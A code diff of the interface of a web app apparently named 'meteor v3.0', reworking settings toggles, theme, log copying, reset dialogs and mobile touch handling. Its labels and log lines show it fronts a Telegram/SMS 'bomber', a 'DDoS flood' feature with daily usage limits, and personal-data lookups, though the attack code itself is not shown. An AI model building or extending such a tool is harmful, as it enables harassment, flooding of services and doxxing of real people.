-        soundSelect.onchange = () => {
-            sound = soundSelect.value === 'on';
-            localStorage.setItem('sound', sound);
-        };
-        if (localStorage.getItem('sound') !== null) {
-            sound = localStorage.getItem('sound') === 'true';
-            soundSelect.value = sound ? 'on' : 'off';
-        }
+  // FAB emergency stop
+  document.getElementById('fabStop').onclick = function(){
+    smsRunning = false;
+    ddosActive = false;
+    document.getElementById('fabStop').style.display = 'none';
+    var smsBtnEl = document.getElementById('smsBtn');
+    if(smsBtnEl){ smsBtnEl.disabled = false; smsBtnEl.innerHTML = ICONS.zap+' Запустить бомбер'; }
+    var ddosBtnEl = document.getElementById('ddosBtn');
+    if(ddosBtnEl){ ddosBtnEl.disabled = false; ddosBtnEl.innerHTML = ICONS.zap+' Запустить flood'; }
+    haptic(30);
+    toast('Остановлено','Все процессы прерваны','warn');
+    log('⏹ Emergency stop','warn');
+  };
 
-        // Particles range fix
-        const particleRange = document.getElementById('particleRange');
-        const particleDisplay = document.getElementById('particleCountDisplay');
+  // Settings
+  var themeSel = document.getElementById('themeSelect');
+  if(themeSel){
+    themeSel.value = localStorage.getItem('meteor.theme')||'dark';
+    document.body.setAttribute('data-theme', themeSel.value);
+    themeSel.onchange = function(){
+      document.body.setAttribute('data-theme', themeSel.value);
+      localStorage.setItem('meteor.theme', themeSel.value);
+      var meta = document.querySelector('meta[name="theme-color"]');
+      if(meta) meta.content = themeSel.value==='light' ? '#f2f2f8' : '#0a0a0f';
+      toast('Тема', themeSel.value, 'info');
+    };
+  }
 
-        function updateParticles(count) {
-            const container = document.getElementById('particles');
-            container.innerHTML = '';
-            for (let i = 0; i < count; i++) {
-                const p = document.createElement('div');
-                p.className = 'particle';
-                const size = Math.random() * 6 + 2;
-                p.style.width = size + 'px';
-                p.style.height = size + 'px';
-                p.style.left = Math.random() * 100 + '%';
-                p.style.animationDuration = Math.random() * 14 + 8 + 's';
-                p.style.animationDelay = Math.random() * 12 + 's';
-                container.appendChild(p);
-            }
-            particleDisplay.textContent = count;
-            localStorage.setItem('particles', count);
-        }
+  var rm = document.getElementById('reducedMotion');
+  if(rm){
+    var rmVal = localStorage.getItem('meteor.reduced')==='true';
+    rm.classList.toggle('on', rmVal);
+    document.body.classList.toggle('reduced', rmVal);
+    rm.onclick = function(){
+      var v = !rm.classList.contains('on');
+      rm.classList.toggle('on', v);
+      document.body.classList.toggle('reduced', v);
+      localStorage.setItem('meteor.reduced', v);
+      haptic(8);
+    };
+  }
 
-        particleRange.addEventListener('input', function() {
-            const val = parseInt(this.value);
-            updateParticles(val);
-        });
+  var bgAnim = document.getElementById('bgAnimation');
+  if(bgAnim){
+    var bgVal = localStorage.getItem('meteor.bgAnim')!=='false';
+    bgAnim.classList.toggle('on', bgVal);
+    document.querySelectorAll('.bg-glow').forEach(function(el){ el.style.display = bgVal?'':'none'; });
+    bgAnim.onclick = function(){
+      var v = !bgAnim.classList.contains('on');
+      bgAnim.classList.toggle('on', v);
+      document.querySelectorAll('.bg-glow').forEach(function(el){ el.style.display = v?'':'none'; });
+      localStorage.setItem('meteor.bgAnim', v);
+      haptic(8);
+    };
+  }
 
-        const savedParticles = parseInt(localStorage.getItem('particles')) || 40;
-        particleRange.value = savedParticles;
-        updateParticles(savedParticles);
+  var haptics = document.getElementById('haptics');
+  if(haptics){
+    var hVal = localStorage.getItem('meteor.haptics')!=='false';
+    haptics.classList.toggle('on', hVal);
+    haptics.onclick = function(){
+      var v = !haptics.classList.contains('on');
+      haptics.classList.toggle('on', v);
+      localStorage.setItem('meteor.haptics', v);
+      if(v) haptic(20);
+    };
+  }
 
-        // Eco mode
-        const ecoToggle = document.getElementById('ecoToggle');
-        ecoToggle.onclick = () => {
-            ecoMode = !ecoMode;
-            ecoToggle.classList.toggle('active', ecoMode);
-            localStorage.setItem('eco', ecoMode);
-            if (ecoMode) {
-                document.getElementById('particles').style.display = 'none';
-                document.querySelectorAll('.bg-glow').forEach(el => el.style.display = 'none');
-                document.querySelectorAll('.card').forEach(el => el.style.backdropFilter = 'none');
-            } else {
-                document.getElementById('particles').style.display = 'block';
-                document.querySelectorAll('.bg-glow').forEach(el => el.style.display = 'block');
-                document.querySelectorAll('.card').forEach(el => el.style.backdropFilter = 'blur(16px)');
-            }
-        };
-        if (localStorage.getItem('eco') === 'true') {
-            ecoMode = true;
-            ecoToggle.classList.add('active');
-            document.getElementById('particles').style.display = 'none';
-            document.querySelectorAll('.bg-glow').forEach(el => el.style.display = 'none');
-            document.querySelectorAll('.card').forEach(el => el.style.backdropFilter = 'none');
-        }
+  var restartBtn = document.getElementById('restartBtn');
+  if(restartBtn) restartBtn.onclick = function(){
+    haptic(15);
+    showModal('Перезагрузить?', 'Приложение будет перезагружено.', function(){ location.reload(); });
+  };
 
-        // Restart
-        document.getElementById('restartBtn').onclick = () => {
-            location.reload();
-        };
+  var resetBtn = document.getElementById('resetBtn');
+  if(resetBtn) resetBtn.onclick = function(){
+    haptic(15);
+    showModal('Сбросить всё?', 'Все настройки будут удалены. Это действие нельзя отменить.', function(){
+      localStorage.clear(); location.reload();
+    });
+  };
 
-        // Reset
-        document.getElementById('resetBtn').onclick = () => {
-            localStorage.clear();
-            location.reload();
-        };
+  var devBtn = document.getElementById('devBtn');
+  if(devBtn) devBtn.onclick = function(){
+    haptic(10);
+    window.open('https://t.me/speedtroll','_blank');
+  };
 
-        // Developer contact
-        document.getElementById('devContactBtn').onclick = () => {
-            window.open('https://t.me/speedtroll', '_blank');
-        };
+  var clearLogs = document.getElementById('clearLogs');
+  if(clearLogs) clearLogs.onclick = function(){
+    var g = document.getElementById('globalLog'); if(g) g.innerHTML='';
+    log('Логи очищены','info');
+    haptic(10);
+  };
+  var copyLogs = document.getElementById('copyLogs');
+  if(copyLogs) copyLogs.onclick = function(){
+    var text = '';
+    document.querySelectorAll('#globalLog .log-line').forEach(function(l){ text += l.innerText+'\n'; });
+    if(navigator.clipboard){
+      navigator.clipboard.writeText(text).then(function(){
+        toast('Скопировано','Логи в буфере','ok');
+      }).catch(function(){ toast('Ошибка','Не удалось скопировать','err'); });
+    } else {
+      var ta = document.createElement('textarea');
+      ta.value = text; document.body.appendChild(ta); ta.select();
+      document.execCommand('copy'); ta.remove();
+      toast('Скопировано','Логи в буфере','ok');
+    }
+    haptic(10);
+  };
 
-        // ============================================================
-        //  LOGS
-        // ============================================================
-        document.getElementById('clearLogs').onclick = () => {
-            document.getElementById('globalLog').innerHTML = '';
-            log('logs cleared', 'info');
-        };
-        document.getElementById('copyLogs').onclick = () => {
-            let text = '';
-            document.querySelectorAll('#globalLog .log-line').forEach(l => text += l.innerText + '\n');
-            navigator.clipboard.writeText(text);
-            log('⎘ copied', 'success');
-        };
+  // Slider labels
+  document.querySelectorAll('input[type=range]').forEach(function(sl){
+    var valEl = document.getElementById(sl.id+'Val');
+    if(valEl){
+      sl.oninput = function(){
+        valEl.textContent = sl.value;
+      };
+      sl.onchange = function(){ haptic(5); };
+    }
+  });
 
-        // ============================================================
-        //  REPORT MODAL CONTROLS
-        // ============================================================
-        document.getElementById('downloadReportBtn').onclick = downloadReport;
-        document.getElementById('copyReportBtn').onclick = copyReport;
-        document.getElementById('closeReportBtn').onclick = closeReport;
-        document.getElementById('reportModal').addEventListener('click', function(e) {
-            if (e.target === this) closeReport();
-        });
+  // Toggle sound
+  document.addEventListener('click', function(e){
+    if(e.target.closest('.toggle')) haptic(8);
+  });
+}
 
-        // ============================================================
-        //  NAVIGATION
-        // ============================================================
-        const pages = {
-            home: document.getElementById('page-home'),
-            search: document.getElementById('page-search'),
-            domain: document.getElementById('page-domain'),
-            spam: document.getElementById('page-spam'),
-            settings: document.getElementById('page-settings'),
-            logs: document.getElementById('page-logs')
-        };
+/* ---------- PREVENT PULL-TO-REFRESH & ZOOM ---------- */
+document.addEventListener('touchmove', function(e){
+  if(e.touches.length > 1) e.preventDefault();
+}, { passive: false });
 
-        document.querySelectorAll('.nav-btn').forEach(btn => {
-            btn.onclick = () => {
-                const page = btn.getAttribute('data-page');
-                document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
-                btn.classList.add('active');
-                Object.values(pages).forEach(p => p.classList.remove('active'));
-                pages[page].classList.add('active');
-            };
-        });
+var lastTouch = 0;
+document.addEventListener('touchend', function(e){
+  var now = Date.now();
+  if(now - lastTouch <= 300) e.preventDefault();
+  lastTouch = now;
+}, false);
 
-        // ============================================================
-        //  INIT
-        // ============================================================
-        updateLimitDisplays();
-        log('✦ meteor v3.0 loaded', 'success');
-        log('◈ Search: username (25+ sites), email (40+ sites), phone, IP', 'info');
-        log('⊹ Domain: theHarvester + Subfinder integration', 'info');
-        log('💡 Daily limits: Spam 5, DDoS 3, Search 10', 'info');
-        updateStats();
-    </script>
+document.addEventListener('gesturestart', function(e){ e.preventDefault(); });
+
+/* ---------- VISIBILITY: pause intervals when hidden ---------- */
+document.addEventListener('visibilitychange', function(){
+  if(document.hidden){
+    // Optional: could pause DDoS here
+  }
+});
+
+/* ---------- BOOT ---------- */
+function boot(){
+  buildUI();
+  updateStats();
+
+  log('⚡ meteor v3.0 Mobile loaded','success');
+  log('📱 Оптимизировано для touch-устройств','info');
+  log('💣 Telegram Bomber ready','warn');
+  log('🌐 DDoS Flood ready','warn');
+
+  setTimeout(function(){
+    toast('meteor готов','Mobile Edition загружено','ok',3500);
+  }, 600);
+}
+
+if(document.readyState==='loading'){
+  document.addEventListener('DOMContentLoaded', boot);
+} else {
+  boot();
+}
+
+})();
+</script>
 </body>
 </html>
